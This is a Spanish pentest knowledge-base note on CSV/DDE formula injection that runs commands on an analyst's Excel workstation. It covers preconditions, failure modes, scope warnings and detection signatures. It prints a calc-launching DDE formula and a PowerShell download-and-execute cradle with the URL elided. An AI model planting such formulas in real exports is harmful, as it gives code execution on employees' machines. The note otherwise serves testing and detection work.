---
tipo: tradecraft
clase: "[[CWE-1236 - Improper Neutralization of Formula Elements in a CSV File]]"
eje: capacidad
implementacion: "Plantar una fórmula DDE que lanza un comando en la máquina del analista al abrir el export"
opsec: ruidoso
telemetria: ["[[Registro del WAF]]", "[[Log de auditoría de la aplicación]]"]
requisitos: [campo-exportado-a-csv, DDE-o-macros-habilitados-en-el-cliente]
coste: medio
alternativas: ["[[CSV - fuga de datos por fórmula]]", "[[Command injection - canal directo]]"]
probado: nunca
contexto: [win-office]
aliases:
  - DDE injection
  - CSV RCE
tags:
  - dominio/web
---

# CSV - ejecución de comandos por fórmula

## Cuándo lo elijo

Cuando la exfiltración por fórmula está confirmada y el objetivo es **ejecutar comandos** en la máquina del analista, no solo leer celdas. Se elige cuando la pila del lado del cliente lo permite —Excel en Windows con DDE habilitado, o macros—, que es una condición fuerte y cada vez más rara.

Es la capacidad más grave del dominio —ejecución en una máquina interna con los privilegios del analista— y la de mayor requisito. Si DDE está deshabilitado, esta rama no aplica y la exfiltración de [[CSV - fuga de datos por fórmula]] es el techo.

## Por qué funciona

El intercambio dinámico de datos (DDE) de Windows permite que una celda lance otro programa. Una fórmula DDE en el CSV, al abrirse en Excel con DDE habilitado, ejecuta un comando:

```
=cmd|'/c calc'!A1
=cmd|'/c powershell -c "IEX(New-Object Net.WebClient).DownloadString(...)"'!A1
```

Al abrir el archivo, Excel muestra una o dos advertencias —"¿habilitar contenido externo?"—; si el analista las acepta, el comando ejecuta con sus privilegios. La segunda etapa —descargar y correr un implante— es la misma que en cualquier ejecución inicial, y se sigue por el lado de post-explotación.

Los payloads de DDE por versión están en [[CSV - matriz de referencia]]. El impacto es equivalente a [[Command injection - canal directo]] pero **desplazado**: el comando no corre en el servidor web sino en la estación del analista, que suele estar en la red interna con acceso a cosas que el servidor no tiene.

## Cómo falla

Falla —y es lo normal hoy— cuando **DDE está deshabilitado**, que es el valor por defecto en las versiones modernas de Office desde que DDE se volvió un vector conocido de malware. Sin DDE, la fórmula no lanza procesos.

Falla cuando el analista **rechaza las advertencias** de contenido externo, que Excel muestra de forma prominente. A diferencia de la exfiltración —que muchas funciones hacen sin preguntar—, la ejecución casi siempre pide confirmación.

Y falla contra el prefijado en la exportación, igual que toda la clase.

## Coste

Medio, y muy dependiente del entorno. Plantar la fórmula es trivial; que funcione depende de una pila del lado del cliente que hoy es minoritaria —DDE habilitado, advertencias aceptadas—. Es un ataque de baja probabilidad por intento pero alto impacto cuando cae.

Conviene tratarla como oportunista: plantar el payload junto con la exfiltración —que sí es fiable— y ganar la ejecución si el entorno resulta vulnerable, en vez de apostar el hallazgo a ella.

> [!warning] Esto ejecuta en una máquina interna real
> Si funciona, corre un comando en la estación de un empleado del objetivo. En un pentest hay que acordar el alcance —muchas reglas de enfrentamiento excluyen la ejecución en estaciones de trabajo— y usar un payload inocuo (`calc`) para demostrar, no uno destructivo.

## Huella esperada

Firma sobre la entrada como la exfiltración, y —si ejecuta— un efecto que el vault sí modela, pero del lado del cliente:

- El campo plantado empieza con `=cmd|` o `=DDE(`, una firma inconfundible sobre la entrada, que ve [[Registro del WAF]] y queda en [[Log de auditoría de la aplicación]]. Más específica aún que la de exfiltración, porque `=cmd|` no tiene ningún uso legítimo.
- Si el comando ejecuta, **nace un proceso hijo de Excel** en la máquina del analista —`cmd.exe` o `powershell.exe` con padre `excel.exe`—. Eso lo vería una detección de proceso equivalente a [[Intérprete de comandos como hijo del servidor web]] pero en la estación, no en el servidor: el vault modela esa relación para el servidor web, no para Office, así que es un hueco de cobertura —la telemetría de endpoint de [[MOC - Telemetría de Windows]] la vería, pero no hay una detección escrita para el par `excel.exe` → `cmd.exe`.

Es el caso del dominio con el efecto más detectable, pero en un lugar que el vault modela para el servidor y no para la estación del analista. La firma de entrada es la parte escribible; la ejecución la cubriría una detección de proceso hijo de Office que queda como hueco. Anotado en [[MOC - CSV injection]].
